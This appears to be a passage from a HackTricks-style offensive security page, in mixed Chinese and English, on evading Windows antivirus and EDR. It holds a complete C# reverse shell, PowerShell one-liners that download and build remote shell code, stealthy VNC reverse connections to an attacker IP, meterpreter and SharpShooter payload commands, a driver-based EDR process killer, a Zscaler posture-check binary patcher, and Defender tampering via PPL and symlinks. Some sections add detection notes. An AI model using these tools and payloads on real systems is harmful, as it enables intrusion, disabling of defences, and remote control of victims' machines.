直到 Windows10，所有 Windows 都带有一个可以安装的 **Telnet server**（以管理员身份）操作如下：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
让它在系统启动时**启动**，并立即**运行**：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**更改 telnet port** (stealth) 并禁用 firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

下载自: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**在主机上**：执行 _**winvnc.exe**_ 并配置服务器：

- 启用选项 _Disable TrayIcon_
- 在 _VNC Password_ 中设置密码
- 在 _View-Only Password_ 中设置密码

然后，将二进制文件 _**winvnc.exe**_ 和新创建的文件 _**UltraVNC.ini**_ 移动到 **受害者**

#### **Reverse connection**

攻击者 应该在其 主机 上 执行二进制文件 `vncviewer.exe -listen 5900`，这样它会准备好捕获一个 reverse **VNC connection**。然后，在 **受害者** 上：启动 winvnc 守护进程 `winvnc.exe -run` 并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** 为了保持隐蔽你必须避免以下操作

- 不要启动 `winvnc` 如果它已经在运行，否则会触发一个 [popup](https://i.imgur.com/1SROTTl.png)。使用 `tasklist | findstr winvnc` 检查它是否在运行
- 不要在没有与其相同目录下的 `UltraVNC.ini` 情况下启动 `winvnc`，否则会导致 [the config window](https://i.imgur.com/rfMQWcf.png) 打开
- 不要运行 `winvnc -h` 寻求帮助，否则会触发一个 [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

下载自: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
在 GreatSCT 内部：
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
现在使用 `msfconsole -r file.rc` **启动 lister** 并使用以下命令 **执行** **xml payload**：
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**当前防护程序会非常快地终止该进程。**

### 编译我们自己的 reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 第一个 C# Revershell

使用以下命令编译：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
与其配合使用：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# 使用编译器
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自动下载并执行：
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 混淆器列表: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 使用 python 构建注入器示例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 其他工具
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 更多

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 从内核空间终止 AV/EDR

Storm-2603 利用了一个名为 **Antivirus Terminator** 的小型控制台实用程序，在释放 ransomware 之前禁用端点防护。该工具带有其**自身的易受攻击但已签名的驱动程序**，并滥用它来发出特权内核操作，甚至 Protected-Process-Light (PPL) 的 AV 服务也无法阻止。

主要要点
1. **Signed driver**: 写入磁盘的文件是 `ServiceMouse.sys`，但二进制是 Antiy Labs 的 “System In-Depth Analysis Toolkit” 中合法签名的驱动 `AToolsKrnl64.sys`。因为该驱动具有有效的 Microsoft 签名，即使启用了 Driver-Signature-Enforcement (DSE) 也会被加载。
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
第一行将驱动注册为 **内核服务**，第二行启动它，使 `\\.\ServiceMouse` 可从用户态访问。
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD 完全绕过用户态保护；在内核中执行的代码可以打开受保护的进程、终止它们，或篡改内核对象，而不受 PPL/PP、ELAM 或其他强化功能的限制。

Detection / Mitigation
•  启用 Microsoft 的 vulnerable-driver 黑名单（`HVCI`, `Smart App Control`），以使 Windows 拒绝加载 `AToolsKrnl64.sys`。  
•  监控新内核服务的创建，并在驱动从可被全员写入的目录加载或不在允许列表上时发出告警。  
•  监视对自定义设备对象的用户态句柄创建，随后伴随可疑的 `DeviceIoControl` 调用。

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler 的 **Client Connector** 在本地应用设备合规（device-posture）规则，并依赖 Windows RPC 将结果传达给其他组件。两个弱的设计选择使得完整绕过成为可能：

1. Posture evaluation 完全在客户端进行（只向服务器发送一个布尔值）。  
2. 内部 RPC 端点只验证连接可执行文件是否由 Zscaler 签名（通过 `WinVerifyTrust`）。

通过对磁盘上四个已签名二进制进行补丁，可以中和这两种机制：

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Always returns `1` so every check is compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
替换原始文件并重启服务栈后：

* **所有** 状态检查显示 **绿色/合规**。
* 未签名或已修改的二进制可打开命名管道 RPC 端点（例如 `\\RPC Control\\ZSATrayManager_talk_to_me`）。
* 被入侵主机可获得 Zscaler 策略定义的内部网络的无限制访问。

该案例展示了如何通过少量字节修补，击破纯客户端信任决策和简单签名检查。

## 滥用 Protected Process Light (PPL) 以使用 LOLBINs 篡改 AV/EDR

Protected Process Light (PPL) 强制执行签名者/等级层次，因此只有相同或更高权限的受保护进程才能相互篡改。进攻上，如果你可以合法启动一个启用了 PPL 的二进制并控制其参数，你可以将良性功能（例如日志记录）转换为一个受限的、由 PPL 支持的写入原语，针对 AV/EDR 使用的受保护目录。

What makes a process run as PPL
- 目标 EXE（以及任何加载的 DLLs）必须用支持 PPL 的 EKU 签名。
- 进程必须使用 CreateProcess 并带上标志创建：`EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- 必须请求与二进制签名者相匹配的兼容保护级别（例如，针对反恶意软件签名者使用 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`，针对 Windows 签名者使用 `PROTECTION_LEVEL_WINDOWS`）。错误的级别将在创建时失败。

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 已签名的系统二进制文件 `C:\Windows\System32\ClipUp.exe` 会自我生成子进程，并接受一个参数以将日志文件写入调用者指定的路径。
- 当以 PPL 进程启动时，文件写入将获得 PPL 保护。
- ClipUp 无法解析包含空格的路径；使用 8.3 短路径来指向通常受保护的位置。

8.3 short path helpers
- 列出短名称：在每个父目录中运行 `dir /x`。
- 在 cmd 中推导短路径：`for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) 使用启动器（例如 CreateProcessAsPPL）以 `CREATE_PROTECTED_PROCESS` 启动可使用 PPL 的 LOLBIN（ClipUp）。
2) 传递 ClipUp 的日志路径参数以在受保护的 AV 目录中强制创建文件（例如 Defender Platform）。如有必要，使用 8.3 短名称。
3) 如果目标二进制文件在运行时通常被 AV 打开/锁定（例如 MsMpEng.exe），通过安装一个能可靠较早运行的自启动服务来安排在 AV 启动前的引导阶段进行写入。使用 Process Monitor（引导日志）验证引导顺序。
4) 重启后，带有 PPL 保护的写入会在 AV 锁定其二进制文件之前发生，从而损坏目标文件并阻止其启动。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- 无法控制 ClipUp 写入的内容（超出放置位置）；该原语更适合破坏而非精确内容注入。
- 需要 local admin/SYSTEM 来安装/启动服务并有重启窗口。
- 时间点非常关键：目标文件不能被打开；在引导时执行可避免文件锁定。

Detections
- 在引导期间出现带有异常参数的 `ClipUp.exe` 进程创建，尤其当父进程不是常规启动器时要注意。
- 新服务被配置为自动启动可疑二进制且始终在 Defender/AV 之前启动。调查 Defender 启动失败前的服务创建/修改。
- 对 Defender 二进制/Platform 目录的文件完整性监控；由带有 protected-process 标志的进程意外创建/修改文件时需警惕。
- ETW/EDR 遥测：查找以 `CREATE_PROTECTED_PROCESS` 创建的进程以及非 AV 二进制异常使用 PPL 等级的情况。

Mitigations
- WDAC/Code Integrity：限制哪些签名二进制可作为 PPL 运行以及在何种父进程下运行；阻止在非合法上下文中调用 ClipUp。
- 服务管理：限制自动启动服务的创建/修改并监控启动顺序的操纵。
- 确保启用 Defender tamper protection 和 early-launch 保护；调查指示二进制被篡改的启动错误。
- 如与环境兼容（需充分测试），可考虑在承载安全工具的卷上禁用 8.3 short-name generation。

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender 通过枚举以下路径下的子文件夹来选择其运行的平台：
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

它会选择字典序（lexicographic）最大的版本子文件夹（例如 `4.18.25070.5-0`），然后从该处启动 Defender 服务进程（并相应更新服务/注册表路径）。此选择过程信任目录条目，包括目录重解析点（symlinks）。管理员可以利用这一点将 Defender 重定向到可被攻击者写入的路径，从而实现 DLL sideloading 或服务中断。

Preconditions
- Local Administrator（需要在 Platform 文件夹下创建目录/symlinks）
- 能够重启或触发 Defender 平台重选（在引导时重启服务）
- 只需内置工具（mklink）

Why it works
- Defender 会阻止对其自身文件夹的写入，但其平台选择信任目录条目，并按字典序选择最高版本，而不验证目标是否解析到受保护/受信任的路径。

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) 在 Platform 内创建一个指向你文件夹的更高版本目录 symlink：
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 选择触发器 (reboot recommended):
```cmd
shutdown /r /t 0
```
4) 验证 MsMpEng.exe (WinDefend) 是否从重定向路径运行：
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
你应该能在 `C:\TMP\AV\` 下看到新的进程路径，并且服务配置/注册表会反映该位置。

Post-exploitation options
- DLL sideloading/code execution: 放置或替换 Defender 从其应用程序目录加载的 DLL，以在 Defender 的进程中执行代码。See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: 移除 version-symlink，这样在下次启动时配置的路径将无法解析，Defender 无法启动:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> 注意：此技术本身不会提供权限提升；它需要 admin rights。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

红队可以将运行时规避从 C2 implant 移出并放到目标模块本身，通过 hook 它的 Import Address Table (IAT) 并将选定的 API 路由到由攻击者控制的、position‑independent code (PIC)。这将规避泛化到超出许多 kits 暴露的小 API 面（例如 CreateProcessA），并将相同的保护扩展到 BOFs 和 post‑exploitation DLLs。

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- 当宿主 DLL 加载时，遍历其 IMAGE_IMPORT_DESCRIPTOR 并修补针对的导入的 IAT 条目（例如 CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc），使其指向轻量的 PIC 包装器。
- 每个 PIC 包装器在对真实 API 地址进行 tail‑call 之前执行规避操作。典型的规避包括：
- 在调用前后对内存进行掩码/取消掩码（例如，加密 beacon 区域，RWX→RX，修改页面名称/权限），然后在调用后恢复。
- Call‑stack spoofing：构造一个良性堆栈并切换到目标 API，使得调用栈分析解析为预期的帧。
- 为了兼容，导出一个接口，以便 Aggressor script（或等效脚本）可以注册要为 Beacon、BOFs 和 post‑ex DLLs hook 哪些 APIs。

Why IAT hooking here
- 对于使用被 hook 导入的任何代码都有效，而无需修改工具代码或依赖 Beacon 去代理特定 API。
- 覆盖 post‑ex DLLs：hook LoadLibrary* 使你可以拦截模块加载（例如 System.Management.Automation.dll、clr.dll）并对它们的 API 调用应用相同的掩码/堆栈规避。
- 通过包装 CreateProcessA/W，恢复对基于调用栈检测的进程生成类 post‑ex 命令的可靠使用。

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
注意事项
- 在完成重定位/ASLR 之后且在第一次使用导入之前应用补丁。像 TitanLdr/AceLdr 这样的 reflective loaders 演示了在被加载模块的 DllMain 中进行 hooking。
- 保持 wrappers 小且对 PIC 安全；通过在打补丁前捕获的原始 IAT 值或通过 LdrGetProcedureAddress 来解析真实的 API。
- 对 PIC 使用 RW → RX 的转换，避免留下可写+可执行的页面。

Call‑stack spoofing stub
- Draugr‑style 的 PIC stubs 构建一个伪造的调用链（返回地址指向良性模块），然后切入真实的 API。
- 这可以绕过那些期望从 Beacon/BOFs 到敏感 API 的规范栈的检测。
- 与 stack cutting/stack stitching 技术配合使用，以在 API prologue 之前落入预期的帧内。

操作集成
- 将 reflective loader 预置到 post‑ex DLLs 之前，这样当 DLL 被加载时 PIC 和 hooks 会自动初始化。
- 使用 Aggressor 脚本注册目标 API，使 Beacon 和 BOFs 无需更改代码即可透明地从相同的规避路径受益。

检测/DFIR 考量
- IAT 完整性：解析到非映像（heap/anon）地址的条目；对导入指针进行定期校验。
- 栈异常：返回地址不属于已加载映像；突兀地转入非映像的 PIC；RtlUserThreadStart 血统不一致。
- loader 遥测：进程内对 IAT 的写入、修改导入 thunks 的早期 DllMain 活动、在加载时创建的意外 RX 区域。
- 映像加载规避：如果 hooking LoadLibrary*，监控与内存掩码事件相关联的可疑 automation/clr 程序集加载。

相关构建模块和示例
- 在加载期间执行 IAT 打补丁的 reflective loaders（例如 TitanLdr、AceLdr）
- Memory masking hooks（例如 simplehook）和 stack‑cutting PIC（stackcutting）
- PIC call‑stack spoofing stubs（例如 Draugr）

## 参考资料

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
